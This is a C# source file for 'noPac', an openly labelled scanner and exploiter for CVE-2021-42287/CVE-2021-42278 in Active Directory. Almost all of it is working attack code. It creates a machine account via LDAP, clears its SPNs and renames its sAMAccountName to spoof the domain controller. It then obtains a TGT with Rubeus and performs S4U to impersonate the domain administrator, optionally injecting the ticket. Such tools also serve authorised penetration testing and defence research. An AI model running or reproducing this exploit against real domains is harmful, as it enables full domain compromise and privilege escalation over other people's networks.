b'\xef\xbb\xbfusing Rubeus;\nusing System;\nusing System.Collections.Generic;\nusing System.DirectoryServices;\nusing System.DirectoryServices.ActiveDirectory;\nusing System.DirectoryServices.Protocols;\nusing System.Linq;\nusing System.Net;\nusing System.Security.AccessControl;\nusing System.Security.Cryptography;\nusing System.Text;\n\nnamespace noPac\n{\n    internal class Program\n    {\n        public static string GetMAQDistinguishedName(string node, string container, string distinguishedName, string domain, bool verbose)\n        {\n            string[] domainComponent;\n\n            switch (container)\n            {\n\n                case "BUILTIN":\n                    container = "CN=Builtin";\n                    break;\n\n                case "COMPUTERS":\n                    container = "CN=Computers";\n                    break;\n\n                case "DOMAINCONTROLLERS":\n                    container = "OU=Domain Controllers";\n                    break;\n\n                case "FOREIGNSECURITYPRINCIPALS":\n                    container = "CN=ForeignSecurityPrincipals";\n                    break;\n\n                case "KEYS":\n                    container = "CN=Keys";\n                    break;\n\n                case "LOSTANDFOUND":\n                    container = "CN=LostAndFound";\n                    break;\n\n                case "MANAGEDSERVICEACCOUNTS":\n                    container = "CN=Managed Service Accounts";\n                    break;\n\n                case "PROGRAMDATA":\n                    container = "CN=Program Data";\n                    break;\n\n                case "USERS":\n                    container = "CN=Users";\n                    break;\n\n                case "ROOT":\n                    container = "";\n                    break;\n\n            }\n\n            if (string.IsNullOrEmpty(distinguishedName))\n            {\n\n                if (!String.IsNullOrEmpty(container))\n                {\n\n                    if (!String.IsNullOrEmpty(node))\n                    {\n                        distinguishedName = String.Concat("CN=", node, ",", container);\n                    }\n                    else\n                    {\n                        distinguishedName = container;\n                    }\n\n                }\n\n                domainComponent = domain.Split(\'.\');\n\n                foreach (string dc in domainComponent)\n                {\n                    distinguishedName += String.Concat(",DC=", dc);\n                }\n\n                distinguishedName = distinguishedName.TrimStart(\',\');\n\n                if (verbose) { Console.WriteLine("[+] Distinguished Name = {0}", distinguishedName); };\n            }\n            else if (!String.IsNullOrEmpty(node))\n            {\n                distinguishedName = String.Concat("DC=", node, ",", distinguishedName);\n            }\n\n            return distinguishedName;\n        }\n        \n        public static void NewMachineAccount(string container, string distinguishedName, string domain, string domainController, string machineAccount, string machinePassword, bool verbose, bool random, NetworkCredential credential)\n        {\n            string samAccountName;\n\n            if (machineAccount.EndsWith("$"))\n            {\n                samAccountName = machineAccount;\n                machineAccount = machineAccount.Substring(0, machineAccount.Length - 1);\n            }\n            else\n            {\n                samAccountName = String.Concat(machineAccount, "$");\n            }\n\n            byte[] unicodePwd;\n            string randomPassword = "";\n\n            if (random)\n            {\n                Console.WriteLine("[*] Generating random machine account password");\n                RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider();\n                byte[] randomBuffer = new byte[16];\n                cryptoServiceProvider.GetBytes(randomBuffer);\n                machinePassword = Convert.ToBase64String(randomBuffer);\n            }\n\n            domain = domain.ToLower();\n            string dnsHostname = String.Concat(machineAccount, ".", domain);\n            string[] servicePrincipalName = { String.Concat("HOST/", dnsHostname), String.Concat("RestrictedKrbHost/", dnsHostname), String.Concat("HOST/", machineAccount), String.Concat("RestrictedKrbHost/", machineAccount) };\n            unicodePwd = Encoding.Unicode.GetBytes(String.Concat(\'"\', machinePassword, \'"\'));\n            distinguishedName = GetMAQDistinguishedName(machineAccount, container, distinguishedName, domain, verbose);\n            LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(domainController, 389);\n            LdapConnection connection = new LdapConnection(identifier);\n\n            if (!String.IsNullOrEmpty(credential.UserName))\n            {\n                connection = new LdapConnection(identifier, credential);\n            }\n\n            try\n            {\n                connection.SessionOptions.Sealing = true;\n                connection.SessionOptions.Signing = true;\n                connection.Bind();\n                AddRequest request = new AddRequest();\n                request.DistinguishedName = distinguishedName;\n                request.Attributes.Add(new DirectoryAttribute("objectClass", "Computer"));\n                request.Attributes.Add(new DirectoryAttribute("sAMAccountName", samAccountName));\n                request.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));\n                request.Attributes.Add(new DirectoryAttribute("dNSHostName", dnsHostname));\n                request.Attributes.Add(new DirectoryAttribute("servicePrincipalName", servicePrincipalName));\n                request.Attributes.Add(new DirectoryAttribute("unicodePwd", unicodePwd));\n                connection.SendRequest(request);\n                connection.Dispose();\n\n                if (random)\n                {\n                    Console.WriteLine("[+] Machine account {0} added with password {1}", machineAccount, randomPassword);\n                }\n                else\n                {\n                    Console.WriteLine("[+] Machine account {0} added", machineAccount);\n                }\n\n            }\n            catch (Exception ex)\n            {\n\n                if (ex.Message.Contains("The object exists."))\n                {\n                    Console.WriteLine("[!] Machine account {0} already exists", machineAccount);\n                }\n                else if (ex.Message.Contains("The server cannot handle directory requests."))\n                {\n                    Console.WriteLine("[!] User may have reached ms-DS-MachineAccountQuota limit");\n                }\n\n                Console.WriteLine(ex.ToString());\n                connection.Dispose();\n                throw;\n            }\n\n        }\n\n        public static void SetMachineAccountAttribute(string container, string distinguishedName, string domain, string domainController, string attribute, string machineAccount, string value, bool append, bool clear, bool verbose, NetworkCredential credential)\n        {\n            distinguishedName = GetMAQDistinguishedName(machineAccount, container, distinguishedName, domain, false);\n\n            if (attribute.Equals("msDS-AllowedToActOnBehalfOfOtherIdentity"))\n            {\n                RawSecurityDescriptor rawSecurityDescriptor = new RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + value + ")");\n                byte[] descriptor = new byte[rawSecurityDescriptor.BinaryLength];\n                rawSecurityDescriptor.GetBinaryForm(descriptor, 0);\n            }\n\n            DirectoryEntry directoryEntry;\n\n            if (!String.IsNullOrEmpty(credential.UserName))\n            {\n                directoryEntry = new DirectoryEntry(String.Concat("LDAP://", domainController, "/", distinguishedName), credential.UserName, credential.Password);\n            }\n            else\n            {\n                directoryEntry = new DirectoryEntry(String.Concat("LDAP://", domainController, "/", distinguishedName));\n            }\n\n            try\n            {\n\n                if (append)\n                {\n                    directoryEntry.Properties[attribute].Add(value);\n                    directoryEntry.CommitChanges();\n                    Console.WriteLine("[+] Machine account {0} attribute {1} appended", machineAccount, attribute);\n                }\n                else if (clear)\n                {\n                    directoryEntry.Properties[attribute].Clear();\n                    directoryEntry.CommitChanges();\n                    Console.WriteLine("[+] Machine account {0} attribute {1} cleared", machineAccount, attribute);\n                }\n                else\n                {\n                    directoryEntry.InvokeSet(attribute, value);\n                    directoryEntry.CommitChanges();\n                    Console.WriteLine("[+] Machine account {0} attribute {1} updated", machineAccount, attribute);\n                }\n\n            }\n            catch (Exception ex)\n            {\n                Console.WriteLine(ex.ToString());\n                throw;\n            }\n\n            if (!String.IsNullOrEmpty(directoryEntry.Path))\n            {\n                directoryEntry.Dispose();\n            }\n\n        }\n\n        public static Dictionary<string, string> getDCs(string domain, string username, string password, string domainController)\n        {\n            Dictionary<string, string> list = new Dictionary<string, string>();\n            string endpoint = "";\n            if(string.IsNullOrEmpty(domainController))\n            {\n                endpoint = domain;\n            }\n            else\n            {\n                endpoint = domainController;\n            }\n            DirectoryEntry directoryEntry = new DirectoryEntry(String.Concat("LDAP://", endpoint), username, password);\n            DirectorySearcher searcher = new DirectorySearcher(directoryEntry);\n            searcher.Filter = "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))";\n            searcher.PropertiesToLoad.AddRange(new string[] { "dnshostname", "Ipv4address" });\n            foreach (SearchResult result in searcher.FindAll())\n            {\n                DirectoryEntry entry = result.GetDirectoryEntry();\n                //Console.WriteLine("dnshostname: " + entry.Properties["dnshostname"].Value);\n                //Console.WriteLine("IPv4Address: " + entry.Properties["IPv4Address"].Value);\n                list.Add(entry.Properties["dnshostname"].Value.ToString(), "");\n            }\n            return list;\n        }\n        \n        public static Dictionary<string, string> getDCs()\n        {\n            Dictionary<string, string> list = new Dictionary<string, string>();\n\n            Domain domain = Domain.GetCurrentDomain();\n\n            foreach (DomainController dc in domain.DomainControllers)\n            {\n                list.Add(dc.Name, dc.IPAddress);\n            }\n            return list;\n        }\n\n        public static void scan(string domain, string username, string password, string passwordHash, string domainController)\n        {\n            Dictionary<string, string> DCs = new Dictionary<string, string>();\n            DCs = getDCs(domain, username, password, domainController);\n            //DCs = getDCs();\n\n            foreach (var dc in DCs)\n            {\n                try\n                {\n                    Rubeus.lib.Interop.LUID luid = new Rubeus.lib.Interop.LUID();\n                    byte[] ticket = Ask.TGT(username, domain, passwordHash, Interop.KERB_ETYPE.rc4_hmac, "", false, dc.Key, luid, false, false, "", false, false);\n                    if (ticket.Length > 0)\n                    {\n                        Console.WriteLine("[+] Got TGT from {0}. Ticket size: {1}", dc.Key, ticket.Length);\n                    }\n                    else\n                    {\n                        Console.WriteLine("[-] Could not get TGT from {0}", dc.Key);\n                        continue;\n                    }\n                }catch (Exception ex)\n                {\n                    Console.WriteLine("[-] Could not get TGT from {0}", dc.Key);\n                    Console.WriteLine("[-] Exception {0}", ex);\n                }\n            }\n\n        }\n\n        static void Main(string[] args)\n        {\n            string argDomainUser = "";\n            string argDomainUserPassword = "";\n\n            string argContainer = "COMPUTERS";\n            string argDistinguishedName = "";\n            string argDomain = "";\n            string argDomainController = "";\n            string argTargetSPN = "";\n            string argService = "LDAP";\n            string argImpersonate = "administrator";\n            bool argPTT = false;\n\n            //machine account\n            string argMachineAccount = "";\n            string argMachinePassword = "";\n\n            bool argRandom = false;\n            bool argVerbose = true;\n            Rubeus.lib.Interop.LUID luid = new Rubeus.lib.Interop.LUID();\n\n            if (args == null || !args.Any())\n            {\n                Console.WriteLine();\n                Console.WriteLine("CVE-2021-42287/CVE-2021-42278 Scanner & Exploiter");\n                Console.WriteLine("By @Cube0x0");\n                Console.WriteLine();\n                Console.WriteLine("/domain /user /pass argument needed for scanning");\n                Console.WriteLine("/dc /mAccount /nPassword argument needed for exploitation");\n                Console.WriteLine();\n                Console.WriteLine("Examples:");\n                Console.WriteLine("  noPac.exe scan -domain htb.local -user domain_user -pass \'Password123!\'");\n                Console.WriteLine("  noPac.exe -dc dc02.htb.local -mAccount demo -mPassword Password123!");\n                Console.WriteLine("  noPac.exe -domain htb.local -user domain_user -pass \'Password123!\' /dc dc02.htb.local /mAccount demo /mPassword Password123!");\n                Console.WriteLine("  noPac.exe -domain htb.local -user domain_user -pass \'Password123!\' /dc dc02.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt");\n                return;\n            }\n\n            foreach (var entry in args.Select((value, index) => new { index, value }))\n            {\n                string argument = entry.value.ToUpper();\n\n                switch (argument)\n                {\n                    case "-DOMAIN":\n                    case "/DOMAIN":\n                        argDomain = args[entry.index + 1];\n                        break;\n\n                    case "-USER":\n                    case "/USER":\n                        argDomainUser = args[entry.index + 1];\n                        break;\n\n                    case "-PASS":\n                    case "/PASS":\n                        argDomainUserPassword = args[entry.index + 1];\n                        break;\n                    case "-DC":\n                    case "/DC":\n                        argDomainController = args[entry.index + 1];\n                        break;\n                    case "-MACCOUNT":\n                    case "/MACCOUNT":\n                        argMachineAccount = args[entry.index + 1];\n                        break;\n                    case "-MPASSWORD":\n                    case "/MPASSWORD":\n                        argMachinePassword = args[entry.index + 1];\n                        break;\n                    case "-SERVICE":\n                    case "/SERVICE":\n                        argService = args[entry.index + 1];\n                        break;\n                    case "-IMPERSONATE":\n                    case "/IMPERSONATE":\n                        argImpersonate = args[entry.index + 1];\n                        break;\n                    case "-PTT":\n                    case "/PTT":\n                        argPTT = true;\n                        break;\n                }\n            }\n            NetworkCredential credential = new NetworkCredential(argDomainUser, argDomainUserPassword, argDomain);\n            string machineAccountPasswordHash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, argMachinePassword);\n            string domainUserPasswordHash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, argDomainUserPassword);\n            if (args.Length >= 1)\n            {\n                if (args[0] == "scan")\n                {\n                    if(string.IsNullOrEmpty(argDomain) || string.IsNullOrEmpty(argDomainUser) || string.IsNullOrEmpty(argDomainUserPassword))\n                    {\n                        Console.WriteLine("[-] /domain /user /pass argument needed for scanning");\n                        return;\n                    }\n                    scan(argDomain, argDomainUser, argDomainUserPassword, domainUserPasswordHash, argDomainController);\n                    return;\n                }\n                if (string.IsNullOrEmpty(argDomainController) || string.IsNullOrEmpty(argMachineAccount) || string.IsNullOrEmpty(argMachinePassword))\n                {\n                    Console.WriteLine("[-] /dc /mAccount /mPassword argument needed for exploitation");\n                    return;\n                }\n\n                argTargetSPN = $"{argService}/{argDomainController}";\n                if(String.IsNullOrEmpty(argDomain))\n                    argDomain = String.Join(".", argDomainController.Split(\'.\').Skip(1).ToArray());\n            }\n\n            //new machine account\n            try\n            {\n                NewMachineAccount(argContainer, argDistinguishedName, argDomain, argDomainController, argMachineAccount, argMachinePassword, argVerbose, argRandom, credential);\n            } catch (DirectoryOperationException e)\n            {\n                //so we can rerun the tool using the same machine account or reuse machine account\n                if (!e.Message.Contains("The object exists"))\n                {\n                    Console.WriteLine("[-] Failed to create machine account");\n                    return;\n                }\n            }\n\n            //clean spn\n            SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "serviceprincipalname", argMachineAccount, "", false, true, argVerbose, credential);\n\n            //set samaccountname\n            SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "samaccountname", argMachineAccount, argDomainController.Split(\'.\')[0], false, false, argVerbose, credential);\n\n            //ask tgt\n            byte[] ticket = Ask.TGT(argDomainController.Split(\'.\')[0], argDomain, machineAccountPasswordHash, Interop.KERB_ETYPE.rc4_hmac, "", false, argDomainController, luid, false, false, "", false, true);\n            if (ticket.Length > 0)\n            {\n                Console.WriteLine("[+] Got TGT for {0}", argDomainController);\n                //Console.WriteLine(Convert.ToBase64String(ticket));\n            }\n            else\n            {\n                Console.WriteLine("[-] Could not get TGT for {0}", argDomainController);\n                return;\n            }\n\n            //undo samaccountname change\n            SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "samaccountname", argMachineAccount, argMachineAccount, false, false, argVerbose, credential);\n\n            //s4u\n            KRB_CRED kirbi = new KRB_CRED(ticket);\n            S4U.Execute(kirbi, argImpersonate, "", "", argPTT, argDomainController, argTargetSPN, null, "", "", true, false, false, machineAccountPasswordHash, Interop.KERB_ETYPE.rc4_hmac, argDomain, "");\n        }\n    }\n}\n'